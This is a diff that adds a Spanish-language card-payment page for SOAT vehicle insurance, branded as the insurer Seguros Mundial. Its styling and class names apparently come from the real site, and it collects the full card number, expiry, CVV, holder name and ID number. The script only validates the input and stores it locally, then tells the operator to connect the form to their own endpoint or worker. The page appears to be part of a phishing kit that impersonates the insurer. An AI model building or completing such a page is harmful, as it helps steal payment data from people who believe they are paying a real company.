@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="x-ua-compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="theme-color" content="#FFFFFF">
+<title>Pago con Tarjeta | SOAT</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Ubuntu:ital,wght@0,300;0,400;0,500;0,700;1,300;1,400;1,500;1,700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/css/component---src-pages-index-tsx.2f90ad7b25207235a98b.css">
+<link rel="stylesheet" href="assets/css/commons.db02d5e21360139d3ecd.css">
+<link rel="stylesheet" href="assets/css/styles.e0403c65ea02169718b0.css">
+<link rel="stylesheet" href="assets/css/style-9faaa9e51cea5853.css">
+<link rel="stylesheet" href="assets/css/styles_ltr.css">
+
+<style>
+  body {
+    font-family: 'Ubuntu', Arial, sans-serif;
+    background-color: #f4f7f9;
+    color: #2c3e50;
+    margin: 0;
+    padding: 0;
+  }
+  .card-pay-container {
+    max-width: 620px;
+    margin: 32px auto;
+    padding: 0 16px;
+  }
+  .card-pay-box {
+    background: #ffffff;
+    border-radius: 12px;
+    box-shadow: 0 6px 20px rgba(0, 0, 0, 0.06);
+    padding: 26px;
+  }
+  .card-pay-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 10px;
+    border-bottom: 1px solid #e9eef2;
+    padding-bottom: 16px;
+    margin-bottom: 20px;
+  }
+  .card-pay-header h1 {
+    margin: 0;
+    font-size: 1.4rem;
+    color: #066188;
+  }
+  .resumen-pill {
+    background: #eef7fc;
+    color: #066188;
+    font-weight: 700;
+    padding: 8px 14px;
+    border-radius: 8px;
+    font-size: 0.95rem;
+  }
+  .logos-franquicia {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 18px;
+  }
+  .logos-franquicia img {
+    height: 26px;
+    width: auto;
+    object-fit: contain;
+  }
+  .campo-grupo {
+    margin-bottom: 16px;
+  }
+  .campo-grupo label {
+    display: block;
+    font-size: 0.9rem;
+    font-weight: 600;
+    color: #1f2d3d;
+    margin-bottom: 6px;
+  }
+  .campo-grupo input,
+  .campo-grupo select {
+    width: 100%;
+    box-sizing: border-box;
+    padding: 11px 13px;
+    border: 1px solid #cdd8e2;
+    border-radius: 8px;
+    font-size: 0.98rem;
+    font-family: inherit;
+    background: #ffffff;
+    color: #1f2d3d;
+  }
+  .campo-grupo input:focus,
+  .campo-grupo select:focus {
+    outline: none;
+    border-color: #0a99d6;
+  }
+  .fila-doble {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 14px;
+  }
+  .fila-doc {
+    display: grid;
+    grid-template-columns: 130px 1fr;
+    gap: 12px;
+  }
+  @media (max-width: 520px) {
+    .fila-doble,
+    .fila-doc {
+      grid-template-columns: 1fr;
+    }
+  }
+  #mensaje-errores {
+    display: none;
+    background: #fdecea;
+    border: 1px solid #f5c2c0;
+    color: #7a2a24;
+    border-radius: 8px;
+    padding: 12px 16px;
+    margin-bottom: 18px;
+  }
+  #estado-envio {
+    display: none;
+    background: #e7f6ed;
+    border: 1px solid #b7e4c7;
+    color: #1b5e37;
+    border-radius: 8px;
+    padding: 14px 16px;
+    margin-top: 18px;
+    font-weight: 600;
+  }
+  .acciones-pago {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    gap: 12px;
+    margin-top: 22px;
+    flex-wrap: wrap;
+  }
+  .btn-volver {
+    display: inline-block;
+    padding: 12px 18px;
+    border-radius: 8px;
+    border: 1px solid #0a99d6;
+    color: #0a99d6;
+    background: #ffffff;
+    text-decoration: none;
+    font-weight: 600;
+  }
+  .btn-pagar {
+    padding: 13px 24px;
+    border-radius: 8px;
+    border: none;
+    background: #0a99d6;
+    color: #ffffff;
+    font-size: 1rem;
+    font-weight: 700;
+    cursor: pointer;
+  }
+  .btn-pagar:hover {
+    background: #087daf;
+  }
+</style>
+</head>
+<body>
+
+<!-- Aquí iba includes/header.php -->
+<nav class="menu-module--menu--ff100">
+  <div class="menu-module--menu__container--550e5">
+    <div class="logo-module--wrapper__logo--d2507">
+      <a href="index.html">
+        <img class="safe-gatsby-image-module--safeImage--9bfbe menu-module--menu__container__logos__logo--30a8e"
+             src="assets/img/imagen_1_.png"
+             width="609" height="136" alt="seguros mundial" title="seguros mundial">
+      </a>
+    </div>
+  </div>
+</nav>
+
+<main class="card-pay-container">
+  <form class="card-pay-box" id="form-pago-tarjeta" action="#" method="post" novalidate>
+    <div class="card-pay-header">
+      <h1>Pago con Tarjeta</h1>
+      <div class="resumen-pill">
+        Placa: <span id="resumen-placa">ABC123</span> · Total: <span id="resumen-total">$540.000</span>
+      </div>
+    </div>
+
+    <div class="logos-franquicia">
+      <img src="assets/img/visa.png" alt="Visa">
+      <img src="assets/img/master_card.png" alt="Mastercard">
+    </div>
+
+    <div id="mensaje-errores">
+      <strong>Revisa los datos de la tarjeta:</strong>
+      <ul id="lista-errores" style="margin:8px 0 0 18px;padding:0;"></ul>
+    </div>
+
+    <div class="campo-grupo">
+      <label for="numero-tarjeta">Número de tarjeta</label>
+      <input type="text" id="numero-tarjeta" name="numero" inputmode="numeric"
+             autocomplete="cc-number" maxlength="23" placeholder="0000 0000 0000 0000" required>
+    </div>
+
+    <div class="fila-doble">
+      <div class="campo-grupo">
+        <label for="vencimiento-tarjeta">Vencimiento (MM/AA)</label>
+        <input type="text" id="vencimiento-tarjeta" name="vencimiento" inputmode="numeric"
+               autocomplete="cc-exp" maxlength="5" placeholder="MM/AA" required>
+      </div>
+      <div class="campo-grupo">
+        <label for="cvv-tarjeta">Código de seguridad (CVV)</label>
+        <input type="password" id="cvv-tarjeta" name="cvv" inputmode="numeric"
+               autocomplete="cc-csc" maxlength="4" placeholder="123" required>
+      </div>
+    </div>
+
+    <div class="campo-grupo">
+      <label for="cuotas-tarjeta">Cuotas</label>
+      <select id="cuotas-tarjeta" name="cuotas" required>
+        <option value="1">1 cuota</option>
+        <option value="3">3 cuotas</option>
+        <option value="6">6 cuotas</option>
+        <option value="12">12 cuotas</option>
+        <option value="24">24 cuotas</option>
+      </select>
+    </div>
+
+    <div class="campo-grupo">
+      <label for="titular-tarjeta">Nombre del titular (como figura en la tarjeta)</label>
+      <input type="text" id="titular-tarjeta" name="titular" autocomplete="cc-name"
+             placeholder="Nombre y apellido" required>
+    </div>
+
+    <div class="fila-doc">
+      <div class="campo-grupo">
+        <label for="tipo-doc-titular">Tipo doc.</label>
+        <select id="tipo-doc-titular" name="tipo_doc" required>
+          <option value="CC">CC</option>
+          <option value="CE">CE</option>
+          <option value="NIT">NIT</option>
+          <option value="TI">TI</option>
+          <option value="PS">PS</option>
+        </select>
+      </div>
+      <div class="campo-grupo">
+        <label for="numero-doc-titular">Número de documento del titular</label>
+        <input type="text" id="numero-doc-titular" name="numero_doc" inputmode="numeric"
+               placeholder="Solo números" required>
+      </div>
+    </div>
+
+    <div id="estado-envio"></div>
+
+    <div class="acciones-pago">
+      <a href="pago.html" class="btn-volver">Cambiar medio de pago</a>
+      <button type="submit" class="btn-pagar" id="btn-pagar-tarjeta">Pagar ahora</button>
+    </div>
+  </form>
+</main>
+
+<!-- Aquí iba includes/footer.php -->
+
+<script>
+(function () {
+  'use strict';
+
+  var resumenRaw = sessionStorage.getItem('resumen_soat') || localStorage.getItem('resumen_soat');
+  var resumen = null;
+  if (resumenRaw) {
+    try { resumen = JSON.parse(resumenRaw); } catch (e) {}
+  }
+
+  var placaActual = (resumen && resumen.placa) ? resumen.placa : 'ABC123';
+  var totalActual = (resumen && resumen.total_formato) ? resumen.total_formato : '$540.000';
+
+  document.getElementById('resumen-placa').textContent = placaActual;
+  document.getElementById('resumen-total').textContent = totalActual;
+
+  var inputNumero = document.getElementById('numero-tarjeta');
+  var inputVenc   = document.getElementById('vencimiento-tarjeta');
+  var inputCvv    = document.getElementById('cvv-tarjeta');
+  var inputDoc    = document.getElementById('numero-doc-titular');
+
+  inputNumero.addEventListener('input', function () {
+    var digits = this.value.replace(/\D/g, '').slice(0, 19);
+    this.value = digits.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
+  });
+
+  inputVenc.addEventListener('input', function () {
+    var digits = this.value.replace(/\D/g, '').slice(0, 4);
+    if (digits.length > 2) {
+      this.value = digits.slice(0, 2) + '/' + digits.slice(2);
+    } else {
+      this.value = digits;
+    }
+  });
+
+  inputCvv.addEventListener('input', function () {
+    this.value = this.value.replace(/\D/g, '').slice(0, 4);
+  });
+
+  inputDoc.addEventListener('input', function () {
+    this.value = this.value.replace(/\D/g, '');
+  });
+
+  var form = document.getElementById('form-pago-tarjeta');
+  var boxErrores = document.getElementById('mensaje-errores');
+  var listaErrores = document.getElementById('lista-errores');
+  var estadoEnvio = document.getElementById('estado-envio');
+
+  form.addEventListener('submit', function (e) {
+    e.preventDefault();
+
+    var errores = [];
+    var numeroLimpio = inputNumero.value.replace(/\s+/g, '');
+    var vencimiento  = inputVenc.value.trim();
+    var cvv          = inputCvv.value.trim();
+    var cuotas       = document.getElementById('cuotas-tarjeta').value;
+    var titular      = document.getElementById('titular-tarjeta').value.trim();
+    var tipoDoc      = document.getElementById('tipo-doc-titular').value;
+    var numDoc       = inputDoc.value.trim();
+
+    if (!/^\d{13,19}$/.test(numeroLimpio)) {
+      errores.push('Ingresa un número de tarjeta válido (entre 13 y 19 dígitos).');
+    }
+
+    var matchExp = vencimiento.match(/^(0[1-9]|1[0-2])\/(\d{2})$/);
+    if (!matchExp) {
+      errores.push('Ingresa una fecha de vencimiento válida en formato MM/AA.');
+    }
+
+    if (!/^\d{3,4}$/.test(cvv)) {
+      errores.push('Ingresa un código CVV válido de 3 o 4 dígitos.');
+    }
+
+    if (!cuotas) {
+      errores.push('Selecciona el número de cuotas.');
+    }
+
+    if (titular.length < 3) {
+      errores.push('Ingresa el nombre del titular de la tarjeta.');
+    }
+
+    if (!/^\d{5,15}$/.test(numDoc)) {
+      errores.push('Ingresa un número de documento válido para el titular.');
+    }
+
+    if (errores.length > 0) {
+      listaErrores.innerHTML = '';
+      errores.forEach(function (err) {
+        var li = document.createElement('li');
+        li.textContent = err;
+        listaErrores.appendChild(li);
+      });
+      boxErrores.style.display = 'block';
+      estadoEnvio.style.display = 'none';
+      boxErrores.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      return;
+    }
+
+    boxErrores.style.display = 'none';
+
+    var intentoPago = {
+      medio: 'Tarjeta',
+      placa: placaActual,
+      total: totalActual,
+      ultimos_4: numeroLimpio.slice(-4),
+      vencimiento: vencimiento,
+      cuotas: cuotas,
+      titular: titular,
+      tipo_doc: tipoDoc,
+      numero_doc: numDoc,
+      fecha: new Date().toISOString()
+    };
+
+    sessionStorage.setItem('ultimo_intento_pago', JSON.stringify(intentoPago));
+
+    estadoEnvio.textContent =
+      'Datos validados para la placa ' + placaActual + ' (' + totalActual + ' en ' + cuotas + ' cuota(s)). ' +
+      'Conecta este formulario a tu endpoint o worker si deseas procesarlo de forma remota.';
+    estadoEnvio.style.display = 'block';
+    estadoEnvio.scrollIntoView({ behavior: 'smooth', block: 'center' });
+  });
+})();
+</script>
+
+</body>
+</html>
